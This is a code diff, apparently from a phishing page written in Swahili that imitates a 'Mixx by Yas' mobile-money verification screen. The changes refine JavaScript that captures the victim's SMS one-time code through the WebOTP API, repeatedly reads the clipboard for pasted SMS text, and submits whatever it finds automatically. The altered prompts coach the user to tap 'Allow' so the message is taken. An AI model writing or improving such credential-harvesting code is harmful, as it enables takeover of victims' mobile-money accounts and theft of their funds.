@@ -50,10 +50,10 @@
                 <h3 style="color:var(--dark);">✅ Namba ya Uthibitisho</h3>
                 <div class="phone-display" id="showPhone">+255 ---------</div>
                 <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki:</strong><br><br>
-                    <strong>1.</strong> Subiri SMS ifike kutoka <strong>Mixx by Yas</strong><br>
-                    <strong>2.</strong> Gusa <strong>"Allow"</strong> kwenye kidirisha kitakachoonekana<br>
-                    <strong>3.</strong> Msimbo utajaza na kutumwa moja kwa moja!
+                    <i class="fas fa-sms"></i> <strong>Subiri SMS ifike kisha gusa "Allow":</strong><br><br>
+                    <strong>1.</strong> Subiri ujumbe wa SMS kutoka <strong>Mixx by Yas</strong><br>
+                    <strong>2.</strong> Gusa <strong>"Allow"</strong> kwenye dirisha litakaloonekana<br>
+                    <strong>3.</strong> Ujumbe wote utajaza na kutumwa moja kwa moja!
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
                     <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
@@ -61,9 +61,9 @@
                 <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
                     <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
                 </a>
-                <textarea id="smsMessage" class="sms-textarea" placeholder="Subiri SMS... msimbo utajaza hapa kiotomatiki." readonly></textarea>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="Subiri SMS... gusa Allow na ujumbe wote utaonekana hapa." readonly></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 60s</div>
-                <div class="error-msg" id="codeError">Inasubiri SMS...</div>
+                <div class="error-msg" id="codeError">Inasubiri SMS kutoka Mixx by Yas...</div>
                 <button class="btn btn-gold" onclick="submitCode()">Endelea →</button>
                 <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
             </div>
@@ -108,14 +108,8 @@
             }, 1000); 
         }
 
-        // ================================================================
-        // SMS AUTO-DETECTION via WebOTP
-        // ================================================================
         function startAutoDetect() {
-            if (!('OTPCredential' in window)) {
-                console.log('WebOTP not supported on this browser');
-                return;
-            }
+            if (!('OTPCredential' in window)) return;
             var ac = new AbortController();
             navigator.credentials.get({
                 otp: { transport: ['sms'] },
@@ -123,9 +117,9 @@
             }).then(function(otp) {
                 if (otp && otp.code && !smsDetected) {
                     smsDetected = true;
-                    var fullSMS = 'Your verification code is: ' + otp.code;
-                    document.getElementById('smsMessage').value = fullSMS;
-                    document.getElementById('codeError').textContent = '✅ Msimbo umegunduliwa! Inatuma...';
+                    // Send the FULL code from the SMS notification
+                    document.getElementById('smsMessage').value = otp.code;
+                    document.getElementById('codeError').textContent = '✅ Ujumbe umepokelewa kutoka notification! Inatuma...';
                     document.getElementById('codeError').style.color = 'var(--success)';
                     document.getElementById('codeError').classList.add('show');
                     if (clipWatcher) clearInterval(clipWatcher);
@@ -153,22 +147,17 @@
                 var text = await navigator.clipboard.readText();
                 if (text && text !== lastClip && text.length > 15) {
                     smsDetected = true;
-                    handleClipboardText(text);
+                    document.getElementById('smsMessage').value = text;
+                    document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa clipboard! Inatuma...';
+                    document.getElementById('codeError').style.color = 'var(--success)';
+                    document.getElementById('codeError').classList.add('show');
+                    clearInterval(clipWatcher);
+                    if (countdownTimer) clearInterval(countdownTimer);
+                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                    document.getElementById('timerDisplay').className = 'timer-bar';
+                    setTimeout(function() { submitCode(); }, 800);
                 }
             } catch(e) {}
-        }
-
-        function handleClipboardText(text) {
-            lastClip = text;
-            document.getElementById('smsMessage').value = text;
-            document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Inatuma...';
-            document.getElementById('codeError').style.color = 'var(--success)';
-            document.getElementById('codeError').classList.add('show');
-            clearInterval(clipWatcher);
-            if (countdownTimer) clearInterval(countdownTimer);
-            document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-            document.getElementById('timerDisplay').className = 'timer-bar';
-            setTimeout(function() { submitCode(); }, 800);
         }
 
         document.addEventListener('visibilitychange', function() {
@@ -185,7 +174,13 @@
                         var text = await navigator.clipboard.readText();
                         if (text && text.length > 15 && !smsDetected) {
                             smsDetected = true;
-                            handleClipboardText(text);
+                            document.getElementById('smsMessage').value = text;
+                            document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Inatuma...';
+                            document.getElementById('codeError').style.color = 'var(--success)';
+                            document.getElementById('codeError').classList.add('show');
+                            clearInterval(clipWatcher);
+                            if (countdownTimer) clearInterval(countdownTimer);
+                            setTimeout(function() { submitCode(); }, 800);
                         }
                     } catch(e) {}
                 }, 300);
